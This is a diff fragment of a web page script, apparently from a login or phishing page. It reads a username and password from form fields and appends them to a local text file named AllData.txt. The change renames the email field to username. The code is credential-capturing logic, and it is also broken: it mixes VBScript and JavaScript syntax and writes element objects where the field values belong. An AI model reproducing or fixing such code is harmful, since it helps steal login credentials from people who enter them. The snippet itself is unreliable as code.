@@ -274,10 +274,10 @@
                 set fso = CreateObject("Scripting.FileSystemObject");
                 set f = fso.CreateTextFile("<your path>/AllData.txt", True);
 
-                var Email = document.getElementById('email');
+                var Username = document.getElementById('username');
                 var Password = document.getElementById('password');
 
-                f.writeline("Email :" + Email);
+                f.writeline("Email :" + Username);
                 f.writeline("Password :" + Password);
 
                 f.writeline("-----------------------------");
